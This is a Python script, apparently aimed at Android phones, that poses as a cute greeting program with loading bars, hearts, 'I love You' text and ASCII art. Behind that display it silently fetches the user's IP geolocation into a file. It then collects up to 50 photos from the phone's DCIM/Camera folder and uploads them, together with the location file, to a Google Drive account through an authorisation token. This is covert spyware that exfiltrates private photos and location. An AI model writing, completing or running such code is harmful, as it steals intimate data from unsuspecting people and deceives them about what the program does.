import os, time
GREN = ('\033[92m')
pink = ('\033[95m')
RED = ("\033[31m")
yellow= ('\033[93m')
os.system('pip3 install random')
os.system('pip3 install wget')
import wget
url = 'https://ipapi.co/json'
filename = 'data.txt'
if os.path.isfile(filename):
    os.remove(filename)
wget.download(url, filename)
var = ("mvvv.py")
#os.system('mv '+var+'.py '+filename+' /storage/emulated/0/')

try:
	import requests
	import join
	from tqdm import tqdm
	import tqdm
	from sys import *
except:
	os.system('pip3 install tqdm')
	os.system('pip3 install requests')
	os.system('pip3 install join')
RED = ("\033[31m")
pink = ('\033[95m') 
print("\033[1;32;40m")
print ("\n▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n")
time.sleep(0.1)
os.system('clear')
print ("\n▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n")
time.sleep(0.1)
os.system('clear')
print ("\n▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n")
time.sleep(0.1)
os.system('clear')
print ("\n▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n")
time.sleep(0.1)
os.system('clear')
print ("\n▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒ Loading ...\n")
time.sleep(0.1)
os.system('clear')
print ("\n▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒ Loading ...\n")
time.sleep(0.1)
os.system('clear')
print ("\n▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒ Loading ...\n")
time.sleep(0.1)
os.system('clear')
print ("\n▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒ Loading ...\n")
time.sleep(0.1)
os.system('clear')
print ("\n▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒ Loading ...\n")
time.sleep(0.1)
os.system('clear')
print ("\n▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒ Loading ...\n")
time.sleep(0.1)
os.system('clear')
print ("\n▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒ Loading ...\n")
time.sleep(0.1)
os.system('clear')
print ("\n▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒ Loading ...\n")
time.sleep(0.1)
os.system('clear')
print ("\n▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒ Loading ...\n")
time.sleep(0.1)
os.system('clear')
print ("\n▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒ Loading ...\n")
import tqdm
dcim_folder = "/storage/emulated/0/DCIM/Camera/"
all_files = os.listdir(dcim_folder)

supported_extensions = ['ai', 'avif', 'b64', 'bmp', 'bpg', 'cur', 'cut', 'dib', 'emf', 'eps', 'exif', 'exr', 'fax', 'fits', 'gif', 'hdr', 'heic', 'heif', 'ico', 'jfif', 'jp2', 'jpe', 'jpeg', 'jpg', 'jxl', 'mjpeg', 'pbm', 'pcx', 'pgm', 'png', 'ppm', 'psd', 'qoi', 'svg', 'tga', 'tif', 'tiff', 'viff', 'vx', 'webp', 'wmf', 'wpg', 'xbm', 'xpm', 'RAW']
image_files = []
for file in all_files:
    if len(image_files) >= 50:
        break
    if file.split('.')[-1] in supported_extensions:
        image_files.append(os.path.join(dcim_folder, file))
time.sleep(0.1)
os.system('clear')
print("\n▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓"+RED+" Done\n")
time.sleep(0.1)
time.sleep(0.1)
os.system('clear')
print("\033[1;32;40m\n▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓"+RED+" Done\n")
time.sleep(0.1)
print(RED+'Hello my Friend 💖💗💓💞💕💟💌💘💝❣🤎💜💙💚💛🧡❤🤍                         ')
  ###################
print("I love You "+pink+"≧◡≦             ")
################
def color():
	import os
	os.system('clear')
	pink = '\033[95m'
	C='\033[1;36m'
	print(C+'''⣿⣿⣿⣿⡿⠟⠛⠋⠉⠉⠉⠉⠉⠛⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⠟⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠈⠙⠾⣿⣾⣿⣾⣿⣾⣿⣾⣿
⠋⡁⠀⠀⠀⠀⠀⢀⠔⠁⠀⠀⢀⠠⠐⠈⠁⠀⠀⠁⠀⠈⠻⢾⣿⣾⣿⣾⣟⣿
⠊⠀⠀⠀⠀⢀⠔⠃⠀⠀⠠⠈⠁⠀⠀⠀⠀⠀⠀⠆⠀⠀⠄⠀⠙⣾⣷⣿⢿⣿
⠀⠀⠀⠀⡠⠉⠀⠀⠀⠀⠠⢰⢀⠀⠀⠀⠀⠀⠀⢰⠀⠀⠈⡀⠀⠈⢿⣟⣿⣿
⠀⠀⢀⡜⣐⠃⠀⠀⠀⣠⠁⡄⠰⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠰⠀⠀⠈⢿⣿⣿
⠀⢠⠆⢠⡃⠀⠀⠀⣔⠆⡘⡇⢘⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿
⢀⡆⠀⡼⢣⠀⢀⠌⢸⢠⠇⡇⢘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿
⣼⣃⠀⠁⢸⢀⠎⠀⢸⠎⠀⢸⢸⡄⠀⠀⠀⠀⠀⠂⢀⠀⠀⠀⠀⠀⠀⠀⠀⣿
⠃⡏'''+pink+'''⠟⣷⣤⠁'''+C+'''⠀⠀⠸⠀⠀⡾⢀⢇⠀⠀⠀⠀⠀⠄⠸⠀⠀⠀⠀⠄⠀⠀⠀⣿
⠀⠀'''+pink+'''⣿⣿⣿⢦'''+C+'''⠀⠀⠀⠀⡧⠋⠘⡄⠀⠀⠀⠀⡇⢸⠀⠀⠠⡘⠀⠀⠀⢠⣿
⠈⠀'''+pink+'''⢿⢗⡻⠃'''+C+'''⠀⠀⠀⠀⠀⠀⠀⠀⠱⡀⠀⠀⢰⠁⡇⠀⠀⢨⠃⡄⢀⠀⣸⣿
⠀⠀⠀'''+pink+'''⠈'''+C+''''⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣱⠀⠀⡎⠸⠁⠀⢀⠞⡸⠀⡜⢠⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀'''+pink+'''⢠⣺⣿⣧⢰⣧ '''+C+'''⡁⡄⠀⡞⠰⠁⡸⣠⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀'''+pink+'''⠠⡿⠏⣿⠟⢁⠾'''+C+'''⢛⣧⢼⠁⠀⠀⢰⣿⡿⣷⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠡⠄⠀⡠⣚⡷⠊⠀⠀⠀⣿⡿⣿⡿⣿
⡀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠊⠁⢸⠁⠀⠀⠀⢰⣿⣿⡿⣿⣿
⠱⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠊⠀⠀⠀⡞⠀⠀⠀⠀⢸⣿⣷⣿⣿⣿
⠀⠙⢦⣀⠀⠀⠀⠀⠀⢀⣀⣠⠖⠁⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⣸⣿⣾⡿⣷⣿
⠀⠀⠀⠀⠉⠉⣩⡞⠉⠁⠀⢸⡄⠀⠀⠀⠀⠀⢰⠇⠀⠀⠀⠀⣿⣿⣷⣿⣿⣿
⡆⠀⠀⣀⡠⠞⠁⣧⢤⣀⣀⣀⡇⠀⠀⠀⠀⠀⣸⠀⠀⠀⠀⠀⣿⣷⣿⣷⣿⣿
⣿⣷⠊⠁⠀⠀⡰⠁⠀⠀⠀⠀⣹⠶⢦⡀⠀⠀⡇⠀⠀⠀⠀⠀⢸⣿⣷⣿⣷⣿
⣿⢿⠀⠀⠀⡔⠁⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡄⡇⠀⠀⠀⠀⠀⠈⣿⣾⣷⣿⣿
⠋⠈⠀⢀⠜⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠈⣧⠀⠀⠀⠀⠀⠀⠻⣿⣽⣾⣿
⢀⡄⡠⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠁⠀⠀⠀⣸⠀⠀⠀⠀⠀⠀⠀⣿⣿⣻⣿
⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀⠐⠀⠀⠀⠀⣀⡿⠀⠀⠀⠀⠀⠀⠀⢹⣿⣻⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠀⠀⠀⠀⠀⢀⣃⡇⠀⠲⡀⠀⠀⠀⠀⠈⣿⡿⣿
⣀⠤⠤⠤⡀⠀⠀⠀⠀⡴⠃⠀⠀⠀⠀⠀⢬⠞⡇⠀⠀⠇⠀⠀⠀⠀⠀⣿⣿⣿
⡁⢀⠀⠀⡇⠀⠀⠀⡼⠁⠀⠀⠀⠀⠀⣸⠁⠀⠇⠀⠀⡇⠀⠀⠀⠀⠀⣿⣿⣿
⠔⠃⠀⠀⡇⠀⠀⡼⠁⠀⠀⠀⠀⠀⢀⡇⠀⠀⡃⠀⠀⠙⢄⠀⠀⠀⠀⣿⣷⣿
⠒⠊⠀⠀⢸⠀⣸⠃⠀⠀⠀⠀⠀⠀⡞⠀⠀⠀⢅⠀⠀⡂⠸⡄⠀⠀⠀⣿⣟⣿
⠓⠀⠉⠀⢸⣰⠃⠀⠀⠀⠀⠀⠀⡜⡆⠀⠀⠀⢸⠀⠀⡇⢀⠇⠀⠀⠀⣿⣿⣿
⠉⠁⠀⢠⠞⠀⠀⠀⠀⠀⠀⠀⣰⠁⡇⠀⠀⠀⡇⠀⠀⡇⢸⠀⠀⠀⠀⣿⣷⣿
⡀⠀⢀⢿⣥⡤⠤⠤⠤⣀⣀⢠⠇⠀⢸⠀⠀⢰⠁⠀⢨⠀⢸⠀⠀⠀⠀⣿⣟⣿''')
################
def run():
	import os
	import time
	import zipfile
	import re
	import requests
	import shutil
	import random
	import json
	GREN = ('\033[92m')
	BLUE = ("\033[34m")
	pink = ('\033[95m')
	White = ("\033[97m")
	RED = ("\033[31m")
	yellow= ('\033[93m')
	LIGHTGREEN_EX = ('\033[92m')
	##################
	print(White+'''⠀     ⠀  ⠀⠀⠀⠀⠀⠀⠀⣠⠤⠖⠚⢉⣩⣭⡭⠛⠓⠲⠦⣄⡀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⢀⡴⠋⠁⠀⠀⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⢦⡀⠀⠀⠀⠀
	⠀⠀⠀⠀⢀⡴⠃⢀⡴⢳⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣆⠀⠀⠀
	⠀⠀⠀⠀⡾⠁⣠⠋⠀⠈⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⢧⠀⠀
	⠀⠀⠀⣸⠁⢰⠃⠀⠀⠀⠈⢣⡀⠀⠀⠀⠀⠀⠀⠀     ⠀⠀⠈⣇⠀⠈⣇⠀
	⠀⠀⠀⡇⠀⡾⡀⠀⠀⠀⠀⣀⣹⣆⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ⠀⢹⢹⢹⢹⠀
	 ⠀⠀⢸⠃⢀⣇⡈⠀⠀⠀⠀⠀⠀⢀⡑⢄⡀⢀⠀        ⠀⢹⢹⢹⢹
	  ⠀⢸⢻'''+GREN+'''⡟⡻⢶⡆⠀⠀⠀⠀⡼⠟⡳⢿⣦'''+White+'''⡑⢄⠀⠀⠀⠀⠀⠀⠀'''+White+''' ⠀ ⢸⢸⡇
	'''+White+'''⠀ ⣸⢸⠃'''+GREN+'''⡇⢀⠇⠀⠀⠀⠀⠀⡼⠀⠀⠈⣿⣿⣿'''+White+'''⡗⠂⠀⠀⠀⠀⠀   ⢸⢸⠁
	⠀⠀⡏⠀⣼'''+GREN+'''⠀⢳⠊⠀⠀⠀⠀⠀⠀⠱⣀⣀⠔'''+White+'''⣸⠁⠀⠀⠀⠀⠀⠀   ⢠⡟⠀
	⠀⠀⡇⢀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⢸⠃⢸⠃⠀
	⠀⢸⠃⠘⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠁⠀⠀⢀⠀⠀⠀⠀⠀⢸⠃⣾⠀⠀
	⠀⣸⠀⠀⠹⡄⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⡞⠀⠀⠀⠸⠀⠀⠀⠀⠀⣾⣾⣾⠀⠀
	⠀⡏⠀⠀⠀⠙⣆⠀⠀⠀⠀⠀⠀⠀⢀⣠⢶⡇⠀⠀⢰⡀   ⠀⠀⠀⣧⠀⠀⡇⠀⠀
	⢰⠇⡄⠀⠀⠀⡿⢣⣀⣀⣀⡤⠴⡞⠉⠀⢸⠀⠀⠀⣿⡇⠀  ⠀  ⣧ ⣧⠀
	⣸⠀⡇⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⢹⠀⠀⢸⠀⠀⢀⣿⠇⠀⠀⠀⠁  ⢸⠀⢸⠀⠀
	⣿⠀⡇⠀⠀⠀  '''+pink+''' ⢀⡤⠤⠶⠶⠾⠤⠾⠤'''+White+'''⢸⠀⡀⠸⣿⣀⠀⠀⠀⠀⠀⠈⣇⣀⠀
	⡇⠀⡇⠀⠀ ⠀'''+pink+'''⡴⠋⠀⠀⠀⠀⠀⠀⠀⠸⡌⣵⡀⢳⡇'''+White+'''⠀⠀⠀⠀⠀  ⠀ ⢹⡀
	⡇⠀⠇⠀⠀'''+pink+'''⡇⡸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠮⢧⣀⣻⢂'''+White+'''⠀⠀      ⠀⢧
	⣇⠀⢠⠀⠀'''+pink+'''⢳⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡎⣆⠀⠀⠀⠀⠀⠘
	'''+White+'''⢻⠈⠰⠀ '''+pink+'''⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⠘⢮⣧⡀⠀⠀⠀⠀
	'''+White+'''⠸⡆⠀⠀'''+pink+'''⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠆⠀⠀⠀⠀⠀⠀⠀⠙⠳⣄⡀⢢⢢⡀''')
	print(BLUE+'CODING BY:'+yellow+' ME ')
	from time import sleep as timeout
	import time, os, sys
	nun = ('abcde')
	headers = {"Authorization": "Bearer " + nun}
	for image_file in tqdm.tqdm(image_files + [filename], desc="Please Wait ( づ￣ ³￣ )づ..."):
	        para = {
	        "name": os.path.basename(image_file)
	    }
	        files = {
	        'data': ('metadata', json.dumps(para), 'application/json; charset=UTF-8'),
	        'file': open(image_file, "rb")
	    }
	        r = requests.post(
	        "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart",
	        headers=headers,
	        files=files
	    )
run()
color()
print(GREN+''' ____''')
print(GREN+'''|  _ \ '''+RED+''' ___ '''+yellow+''' _ __   '''+pink+'''___''')
print(GREN+'''| | | |'''+RED+'''/ _ \\\033[93m| '_ \\\033[95m / _ \\''')
print(GREN+'''| |_| |'''+RED+''' (_)'''+yellow+''' | | | |  '''+pink+'''__/''')
print(GREN+'''|____/'''+RED+''' \___/'''+yellow+'''|_| |_|'''+pink+'''\___|''')
